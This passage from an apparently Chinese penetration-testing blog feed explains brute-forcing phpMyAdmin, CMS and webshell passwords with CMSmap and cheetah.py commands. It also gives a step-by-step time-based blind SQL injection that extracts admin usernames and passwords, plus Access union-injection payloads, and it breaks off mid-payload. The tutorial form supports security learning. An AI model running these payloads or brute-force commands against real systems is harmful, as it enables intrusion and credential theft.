alt="image-20240201162029158"></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641198.png" alt="image-20240201164734443"></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641136.png" alt="image-20240201165442734"></p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641614.png" alt="image-20240201165821708"></p><p>注意看（Status）状态码和（Length）长度，成功会跳转页面状态码为Status（302）如下图：</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641279.png" alt="image-20240201171430133"></p><p><strong>phpMyAdmin暴力破解v1.3（单线程）</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\phpMyAdmin暴力破解v1.3.exe<br><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641845.png" alt="image-20240202090734625"></p><p><strong>phpMyAdmin暴力破解多线程密码枚举工具</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\phpMyAdmin批量破解工具\phpMyAdmin批量破解工具\phpMyAdmin多线程批量破解工具.exe</p><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641629.png" alt="image-20240202091811087"></p><p><strong>常见cms穷举</strong></p><p>wordpress穷举:<a href="https://github.com/dionach/CMSmap">https://github.com/dionach/CMSmap</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">cmsmap.py 是一个用于扫描和检测内容管理系统（CMS）漏洞的工具。以下是其用法和解释：</span><br><span class="line">扫描选项：</span><br><span class="line">target：目标URL，例如 &#x27;https://example.com:8080/&#x27;。</span><br><span class="line">-f W/J/D/M, --force W/J/D/M：强制扫描特定CMS类型，可选的值为 W（WordPress）、J（Joomla）、D（Drupal）或 M（Moodle）。</span><br><span class="line">-F, --fullscan：进行完整扫描，使用大型插件列表。可能会有误报和速度较慢。</span><br><span class="line">-t , --threads：指定线程数，默认为 5。</span><br><span class="line">-a , --agent：设置自定义用户代理。</span><br><span class="line">-H , --header：添加自定义头信息，例如 &#x27;Authorization: Basic ABCD...&#x27;。</span><br><span class="line">-i , --input：从给定文件中列出的多个目标进行扫描。</span><br><span class="line">-o , --output：将输出保存到文件中。</span><br><span class="line">-E, --noedb：在不搜索漏洞的情况下枚举插件。</span><br><span class="line">-c, --nocleanurls：仅适用于Drupal，禁用清晰的URL。</span><br><span class="line">-s, --nosslcheck：不验证服务器的证书。</span><br><span class="line">-d, --dictattack：在扫描期间运行低强度的字典攻击（每个用户5次尝试）。</span><br><span class="line">暴力破解选项：</span><br><span class="line">-u , --usr：指定用户名或包含用户名的文件。</span><br><span class="line">-p , --psw：指定密码或包含密码的文件。</span><br><span class="line">-x, --noxmlrpc：在不使用XML-RPC的情况下暴力破解WordPress。</span><br><span class="line">后渗透选项：</span><br><span class="line">-k , --crack：破解密码哈希文件（需要安装hashcat，仅适用于WordPress和Joomla）。</span><br><span class="line">-w , --wordlist：指定字典文件。</span><br><span class="line">其他选项：</span><br><span class="line">-v, --verbose：详细模式，默认为假。</span><br><span class="line">-h, --help：显示帮助信息并退出。</span><br><span class="line">-D, --default：使用默认选项运行CMSmap。</span><br><span class="line">-U , --update：更新CMSmap、插件或两者，可选的值为 C（CMSmap）、P（Plugins）或 PC（both）。</span><br><span class="line"></span><br><span class="line">#常用例子</span><br><span class="line">  ./cmsmap.py http://www.wordpress.com//启动</span><br><span class="line">  cmsmap.py https://example.com</span><br><span class="line">  cmsmap.py https://example.com -f W -F --noedb -d</span><br><span class="line">  cmsmap.py https://example.com -i targets.txt -o output.txt</span><br><span class="line">  cmsmap.py https://example.com -u admin -p passwords.txt//破解后台一般使用这个命令</span><br><span class="line">  cmsmap.py -k hashes.txt -w passwords.txt</span><br><span class="line">  </span><br><span class="line">  批量扫描的方法</span><br><span class="line">./cmsmap.py -i /root/wp.txt -u admin -p /root/password.txt -v -o w.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>一句话密码穷举</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">cheetah.py 是一个用于快速暴力破解 Webshell 密码的工具。以下是其用法和解释：</span><br><span class="line">基本用法：</span><br><span class="line">-h, --help：显示帮助信息并退出。</span><br><span class="line">-i, --info：显示 cheetah 的信息并退出。</span><br><span class="line">-v, --verbose：启用详细输出（默认禁用）。</span><br><span class="line">-c, --clear：清除重复的密码（默认禁用）。</span><br><span class="line">-up, --update：更新 cheetah。</span><br><span class="line">-r , --request：指定请求方法，默认为 POST。</span><br><span class="line">-t , --time：指定请求间隔秒数，默认为 0。</span><br><span class="line">-w , --webshell：指定 Webshell 类型，默认自动检测。</span><br><span class="line">-s , --server：指定 Web 服务器名称，默认自动检测。</span><br><span class="line">-n , --number：指定请求参数的数量。</span><br><span class="line">-u , --url：指定 Webshell 的 URL。</span><br><span class="line">-b , --url-file：指定批量 Webshell 的 URL 文件。</span><br><span class="line">-p FILE [FILE ...]：指定密码文件，默认为 pwd.list。</span><br><span class="line"></span><br><span class="line">示例用法：</span><br><span class="line">python cheetah.py -u http://orz/orz.php</span><br><span class="line">python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v</span><br><span class="line">python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list</span><br><span class="line">python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000</span><br><span class="line">python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v</span><br></pre></td></tr></table></figure><p><strong>webshell****密码破解</strong></p><p>burpsuite2.0 通过破解办法</p><p><a href="http://www.yijuhua.com/b.asp"><strong>http://www.yijuhua.com/b.asp</strong></a></p><p><a href="http://www.yijuhua.com/b.php"><strong>http://www.yijuhua.com/b.php</strong></a></p><p><a href="http://www.yijuhua.com/b.aspx"><strong>http://www.yijuhua.com/b.aspx</strong></a></p><p><strong>有验证码后台的破解方法</strong></p><ol><li><p>验证码cookie是否重复利用 </p></li><li><p>验证码是否可以重复利用 </p></li><li><p>验证码是否可以识别</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入篇MySQL+PHP延时注入</title>
      <link href="/post/247e3357.html"/>
      <url>/post/247e3357.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入MySQL-PHP延时注入"><a href="#SQL注入MySQL-PHP延时注入" class="headerlink" title="SQL注入MySQL+PHP延时注入"></a>SQL注入MySQL+PHP延时注入</h1><p>延时注入是一种盲注攻击方法，通过利用MySQL中的<code>sleep()</code>函数来实现。<code>sleep()</code>函数的作用是让数据库暂停执行一段时间，通常与<code>if</code>语句一起使用。例如，以下查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果字符串&quot;root&quot;等于&quot;root&quot;，则数据库会延迟<span class="number">3</span>秒执行；否则输出<span class="number">0</span>。</span><br><span class="line"><span class="keyword">select</span> if(<span class="string">&#x27;root&#x27;</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>延时注入的方法是通过获取数据的长度来进行判断。</p><p>首先，先来获取数据的长度。例如：<code>select if(LENGTH(version())=6,sleep(3),0)</code></p><p>然后，再查询数据。根据已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.），将它们转换为ASCII码进行比较。</p><p>例如，要判断第一个字符是否为”5”，可以使用以下查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 其中，`<span class="built_in">substring</span>()`函数用于截取字符串，`ascii()`函数用于将字符转换为ASCII码。</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>(version(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">53</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202403071639826.png" alt="image-20240307145936647"></p><p>通过不断优化查询语句，逐步获取到更多的信息。</p><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>原理大致上就是先用语句测试数据长度，再用长度查询内容。</p><p>通过在查询语句中添加延时函数，如<code>sleep()</code>，来观察页面的响应时间。如果存在注入的情况下，页面会延迟一段时间返回结果。</p><p>例如，以下查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">5</span>)#</span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">5</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">5</span>)</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH(version())<span class="operator">=</span><span class="number">5</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>其中，<code>and 1=1</code>和<code>and 1=2</code>是恒成立的条件，而<code>and sleep(5)</code>则是通过调用sleep()函数来使数据库暂停执行5秒。如果页面在执行这些查询语句时出现了延时，则说明可能存在注入漏洞。</p><h2 id="2、获取mysql版本"><a href="#2、获取mysql版本" class="headerlink" title="2、获取mysql版本"></a>2、获取mysql版本</h2><p>通过查询<code>version()</code>函数，判断mysql的版本长度 ，当<code>and if(LENGTH(version())=长度,sleep(3),0)</code> 当长度到6的时候 页面延时3秒返回。首先，需要构造一个恶意的登录请求，其中包含延时函数和条件判断语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 确认长度，在URL中添加了if(LENGTH(version())<span class="operator">=</span><span class="number">6</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)语句，它会根据MySQL版本的长度来决定是否执行延时函数。如果页面在接收到这个请求后出现了<span class="number">3</span>秒的延迟，则说明MySQL版本的长度为<span class="number">6</span>。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH(version())<span class="operator">=</span><span class="number">6</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>当知道长度了，就可以用查询数据，使用已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.）将每个字符转换为ASCII码进行比较。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据内容，用语句判断<span class="number">1</span>到<span class="number">6</span>每个字符的长度，其中，`<span class="built_in">substring</span>()`函数用于截取字符串，`ascii()`函数用于将字符转换为ASCII码。结果是：ascii转成字符就是 <span class="number">5.5</span><span class="number">.46</span></span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">53</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">46</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">53</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">4</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">46</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">5</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">52</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> version()),<span class="number">6</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">54</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)  </span><br></pre></td></tr></table></figure><p>放在网站上的测试语句就是第一个数组ascii码53转换字符是 5 ：<code>http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select version()),1,1))=53,sleep(5),0)</code></p><h2 id="3、获取库名"><a href="#3、获取库名" class="headerlink" title="3、获取库名"></a>3、获取库名</h2><p>获取库名也是同样的语句只是把查询的内容改变一个 查询库 select database() -&gt; target_sys</p><p>通过查询<code>database()</code>函数来获取。首先，需要构造一个恶意的登录请求，其中包含延时函数和条件判断语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 确定长度，在这个例子中，我们在URL中添加了if(LENGTH(database())<span class="operator">=</span><span class="number">10</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)语句，它会根据数据库名称的长度来决定是否执行延时函数。如果页面在接收到这个请求后出现了<span class="number">3</span>秒的延迟，则说明数据库名称的长度为<span class="number">10</span>。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH(database())<span class="operator">=</span><span class="number">10</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>长度已经确认，就可以查询库名。接下来，使用已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.）将每个字符转换为ASCII码进行比较。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询库名，通过查询语句来判断第一个字符是否为&quot;t&quot;，其中，<span class="built_in">substring</span>()函数用于截取字符串，ascii()函数用于将字符转换为ASCII码。</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>放在网站上的测试语句就是延时5秒，返回页面：<code>http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select database()),1,1))=116,sleep(5),0)</code></p><h2 id="4、获取表"><a href="#4、获取表" class="headerlink" title="4、获取表"></a>4、获取表</h2><p>查询所有表的长度的方法之一是通过查询<code>information_schema.TABLES</code>表中的<code>TABLE_NAME</code>字段来获取。首先，需要构造一个恶意的登录请求，其中包含延时函数和条件判断语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有表的长度，在这个例子中，我们在URL中添加了if(LENGTH((<span class="keyword">select</span>(group_concat(TABLE_NAME)) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database()))<span class="operator">=</span><span class="number">30</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)语句，它会根据数据库中所有表名的长度来决定是否执行延时函数。如果页面在接收到这个请求后出现了<span class="number">5</span>秒的延迟，则说明所有表名的长度为<span class="number">30</span>。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH((<span class="keyword">select</span>(group_concat(TABLE_NAME)) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database()))<span class="operator">=</span><span class="number">30</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select(group_concat(TABLE_NAME)) from information_schema.TABLES where TABLE_SCHEMA=database()))=30,sleep(5),0)</code></p><p>接下来查询所有表，使用已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.）将每个字符转换为ASCII码进行比较。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询所有表，通过以下查询语句来判断第一个字符是否为&quot;a&quot;，其中，<span class="built_in">substring</span>()函数用于截取字符串，ascii()函数用于将字符转换为ASCII码。</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">SUBSTRING</span>((<span class="keyword">select</span> group_concat(TABLE_NAME)<span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(ascii(SUBSTRING((select group_concat(TABLE_NAME)from information_schema.TABLES where TABLE_SCHEMA=database()),1,1))=97,sleep(5),0)</code></p><h2 id="5-查询字段"><a href="#5-查询字段" class="headerlink" title="5 查询字段"></a>5 查询字段</h2><p>查询admin表的字段的方法之一是通过查询<code>information_schema.COLUMNS</code>表中的<code>COLUMN_NAME</code>字段来获取。首先，需要构造一个恶意的登录请求，其中包含延时函数和条件判断语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 确定数据长度，这个例子中，我们在URL中添加了if(LENGTH((<span class="keyword">select</span> group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>))<span class="operator">=</span><span class="number">20</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)语句，它会根据admin表中所有列名的长度来决定是否执行延时函数。如果页面在接收到这个请求后出现了<span class="number">5</span>秒的延迟，则说明所有列名的长度为<span class="number">20</span>。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH((<span class="keyword">select</span> group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>))<span class="operator">=</span><span class="number">20</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e))=20,sleep(5),0)</code></p><p>接下来，使用已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.）将每个字符转换为ASCII码进行比较。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据内容，通过以下查询语句来判断第一个字符是否为&quot;i&quot;，其中，<span class="built_in">substring</span>()函数用于截取字符串，ascii()函数用于将字符转换为ASCII码。</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">SUBSTRING</span>((<span class="keyword">select</span> group_concat(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> TABLE_NAME<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">5</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(ascii(SUBSTRING((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e),1,1))=105,sleep(5),0)</code></p><h2 id="6、查询内容"><a href="#6、查询内容" class="headerlink" title="6、查询内容"></a>6、查询内容</h2><p>查询admin表中的数据的方法之一是通过查询<code>admin</code>表来获取。首先，需要构造一个恶意的登录请求，其中包含延时函数和条件判断语句。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 确定数据长度，这个例子中，我们在URL中添加了if(LENGTH((<span class="keyword">select</span> GROUP_CONCAT(username,<span class="number">0x3a</span>,password)<span class="keyword">from</span> admin))<span class="operator">=</span><span class="number">38</span>,sleep(<span class="number">5</span>),<span class="number">5</span>)语句，它会根据admin表中所有用户名和密码的组合的长度来决定是否执行延时函数。如果页面在接收到这个请求后出现了<span class="number">5</span>秒的延迟，则说明所有用户名和密码的组合的长度为<span class="number">38</span>。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>target_sys.com<span class="operator">/</span>mysqlinj.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if(LENGTH((<span class="keyword">select</span> GROUP_CONCAT(username,<span class="number">0x3a</span>,password)<span class="keyword">from</span> admin))<span class="operator">=</span><span class="number">38</span>,sleep(<span class="number">5</span>),<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(LENGTH((select GROUP_CONCAT(username,0x3a,password)from admin))=38,sleep(5),5)</code></p><p>接下来，我们可以使用已知的字符集（abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.）将每个字符转换为ASCII码进行比较。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据内容，通过以下查询语句来判断第一个字符是否为&quot;i&quot;，其中，<span class="built_in">substring</span>()函数用于截取字符串，ascii()函数用于将字符转换为ASCII码。</span><br><span class="line"><span class="keyword">select</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> GROUP_CONCAT(username,<span class="number">0x3a</span>,password)<span class="keyword">from</span> admin),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>,sleep(<span class="number">5</span>),<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>测试网站语句：<code>http://target_sys.com/mysqlinj.php?id=1 and if(ascii(substring((select GROUP_CONCAT(username,0x3a,password)from admin),1,1))=97,sleep(5),0)</code></p><p>原理大致上就是先用语句测试数据长度，再用长度查询内容。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入篇</title>
      <link href="/post/db433311.html"/>
      <url>/post/db433311.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入篇"><a href="#SQL注入篇" class="headerlink" title="SQL注入篇"></a>SQL注入篇</h1><h2 id="access-asp-手工注入"><a href="#access-asp-手工注入" class="headerlink" title="access+asp 手工注入"></a>access+asp 手工注入</h2><h3 id="1、access数据库"><a href="#1、access数据库" class="headerlink" title="1、access数据库"></a>1、access数据库</h3><ul><li>access数据库与其他数据库不一样 他没有存储表的库，所以只能猜表。</li></ul><h3 id="2、access数据库结构"><a href="#2、access数据库结构" class="headerlink" title="2、access数据库结构"></a>2、access数据库结构</h3><ul><li>表</li><li>字段</li><li>数据</li></ul><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271717956.png" alt="image-20240218153343144"></p><h3 id="3、判断是否存在注入"><a href="#3、判断是否存在注入" class="headerlink" title="3、判断是否存在注入"></a>3、判断是否存在注入</h3><ul><li><code>and</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   #  正确页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   # 错误页面<span class="keyword">or</span> 判断</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">-104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  # 错误页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   # 正常页面</span><br></pre></td></tr></table></figure><h3 id="4、判断字段数"><a href="#4、判断字段数" class="headerlink" title="4、判断字段数"></a>4、判断字段数</h3><ul><li><code>order by</code> 判断当前表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 一直到出错，不出错的有多少个就是多少个字段数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">10</span>  # 正常</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">11</span>  # 错误</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/h-y-a/picture/raw/master/images/202402271717278.png" alt="image-20240218155121342"></p><h3 id="5、联合查询注入"><a href="#5、联合查询注入" class="headerlink" title="5、联合查询注入"></a>5、联合查询注入</h3><ul><li>猜表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 表存在就会出现些数字并显示，不存在则报错</span><br><span class="line"># 报错可以将 admin 换成别的表</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span 